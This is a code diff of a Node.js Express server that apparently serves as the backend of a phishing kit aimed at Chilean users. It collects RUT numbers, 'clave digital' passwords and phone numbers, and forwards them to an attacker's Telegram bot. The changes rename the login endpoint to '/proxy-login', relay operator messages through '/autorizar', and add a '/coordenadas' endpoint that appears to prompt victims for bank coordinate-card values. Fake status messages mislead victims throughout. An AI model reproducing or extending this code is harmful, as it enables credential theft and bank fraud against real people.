@@ -4,10 +4,8 @@ const cors = require("cors");
 
 const app = express();
 
-// Habilitar CORS para permitir llamadas desde GitHub Pages
+// Habilitar CORS
 app.use(cors());
-
-// Middleware para parsear JSON
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -16,17 +14,16 @@ const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
 // Lista de RUTs bloqueados
-const bloqueados = ["250624344", "25062434-4", "25.062.434-4"]; // agrega aquí los RUTs que quieras bloquear
+const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];
 
-// Endpoint de login
-app.post("/login", async (req, res) => {
+// Endpoint de login (coincide con tu frontend)
+app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, telefono } = req.body;
 
   if (!telefono) {
     return res.status(400).send("❌ El campo 'teléfono' es obligatorio.");
   }
 
-  // Validación de RUT bloqueado
   if (bloqueados.includes(rut)) {
     return res.status(403).send("❌ Tu clave digital ha sido bloqueada");
   }
@@ -43,16 +40,16 @@ Teléfono: ${telefono}`;
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
 
-    res.send("✅ Hemos recibido tu solicitud.");
+    res.send("OK ✅ Login recibido");
   } catch (error) {
     console.error(error);
     res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
   }
 });
 
-// Endpoint de autorización
+// Endpoint de autorización (recibe mensaje dinámico desde frontend)
 app.post("/autorizar", async (req, res) => {
-  const mensaje = "AUTORIZAR!!!";
+  const { mensaje } = req.body;
 
   try {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -66,6 +63,13 @@ app.post("/autorizar", async (req, res) => {
     console.error(error);
     res.status(500).send("❌ Error al enviar autorización.");
   }
+});
+
+// Endpoint para coordenadas dinámicas
+app.get("/coordenadas", (req, res) => {
+  const letras = ["A","B","C","D","E","F"];
+  const seleccion = letras.sort(() => 0.5 - Math.random()).slice(0,3);
+  res.json({ coordenadas: seleccion });
 });
 
 // Iniciar servidor
